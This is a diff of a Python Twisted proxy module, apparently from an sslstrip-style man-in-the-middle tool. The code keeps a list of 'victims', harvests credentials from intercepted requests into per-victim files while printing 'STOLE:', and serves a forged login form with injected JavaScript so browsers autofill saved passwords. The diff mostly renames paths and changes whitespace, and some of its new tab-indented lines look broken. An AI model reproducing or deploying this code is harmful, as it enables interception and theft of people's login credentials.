@@ -17,12 +17,7 @@ from DnsCache import DnsCache
 
 class ClientRequest(Request):
 
-    ''' This class represents incoming client requests and is essentially where
-    the magic begins.  Here we remove the client headers we dont like, and then
-    respond with either favicon spoofing, session denial, or proxy through HTTP
-    or SSL to the server.
-    '''    
-    
+
     def __init__(self, channel, queued, reactor=reactor):
         Request.__init__(self, channel, queued)
         self.reactor       = reactor
@@ -31,16 +26,9 @@ class ClientRequest(Request):
 
     def cleanHeaders(self):
         
-        headers = self.getAllHeaders().copy()
-        
+        headers = self.getAllHeaders().copy()        
         if 'accept-encoding' in headers:
             del headers['accept-encoding']
-
-        #if 'if-modified-since' in headers:
-        #    del headers['if-modified-since']
-
-        #if 'cache-control' in headers:
-        #    del headers['cache-control']
 
         return headers
 
@@ -48,12 +36,11 @@ class ClientRequest(Request):
         if (self.uri.find("http://") == 0):
             index = self.uri.find('/', 7)
             return self.uri[index:]
-
         return self.uri        
 
      
     def isCompromised(self,client):
-        vics = open("vics/allvics",'r+')
+        vics = open("victims/victims.txt",'r+')
         victims = vics.read()        
         vics.close()  
         if client in victims:
@@ -62,13 +49,11 @@ class ClientRequest(Request):
             return False  
              
 
-    def skipThis(self,path,client):
-      
+    def skipThis(self,path,client):      
         if len(path) < 50 and path.find(".") == -1  and self.isCompromised(client) == False:
            return False 
         return True     
    
-
 
     def obfuscate(self,string):
         obfs = ""
@@ -77,9 +62,8 @@ class ClientRequest(Request):
 
         return obfs[:-1]
 
+
     def saveCreds(self,client):
-
-
         uri = self.getPathFromUri()
         k = uri.find("&creds=")
         uri=uri[k+7:]
@@ -90,7 +74,7 @@ class ClientRequest(Request):
         uri=uri.split("|||||")
 
         try:
-           clientFile = open("vics/"+client,'a+')
+           clientFile = open("victims/"+client,'a+')
            for cred in uri:
               clientFile.write(cred[1:]+"\n")
               print "STOLE: "+cred[1:]
@@ -98,6 +82,7 @@ class ClientRequest(Request):
 
         except IOError as (errno, strerror):
            print "IO Error"
+
 
     def handleHostResolvedSuccess(self, address):
         logging.debug("Resolved host successfully: %s -> %s" % (self.getHeader('host'), address))
@@ -146,11 +131,6 @@ class ClientRequest(Request):
         else:
            actAs = "framer"
            print "FRAME: "+url
-           '''
-           vics = open("vics/allvics",'a+')
-           vics.write(client+";")        
-           vics.close()
-           '''
               
         self.dnsCache.cacheResolution(host, address)
                   
@@ -189,20 +169,14 @@ class ClientRequest(Request):
            deferred.addErrback(self.handleHostResolvedError)
         
     def proxyViaHTTP(self, host, method, path, postData,actAs,headers):
-
         connectionFactory          = ServerConnectionFactory(method, path, postData, actAs,headers,self)
-   
-        connectionFactory.protocol = ServerConnection
-             
+   	connectionFactory.protocol = ServerConnection
         self.reactor.connectTCP(host, 80, connectionFactory)
 
     def proxyViaSSL(self, host, method, path, postData, actAs,headers,port):
-
         clientContextFactory       = ssl.ClientContextFactory()
         connectionFactory          = ServerConnectionFactory(method, path, postData,actAs, headers, self)
-            
         connectionFactory.protocol = ServerConnection
-        
         self.reactor.connectSSL(host, port, connectionFactory, clientContextFactory)
 
 
@@ -229,13 +203,12 @@ class ClientRequest(Request):
         return action
 
     def sendForgery(self,host):
-
         self.setResponseCode(200, "OK")
         #print "HOST: "+host
         forgery = open("forgery.js")
-
-        data = "<html><head></head><body><form method=\"POST\" action="+self.getAction(host)+"><input type=\"text\" name=\"user\"/><input type=\"password\" name=\"pass\"/></form><script type=\"text/javascript\">"+forgery.read()+"</script></body></html>"
         
+	data = "<html><head></head><body><form method=\"POST\" action="+self.getAction(host)+"><input type=\"text\" name=\"user\"/><input type=\"password\" name=\"pass\"/></form><script type=\"text/javascript\">"+forgery.read()+"</script></body></html>"
+    
         forgery.close()
         self.write(data)
         self.finish()      
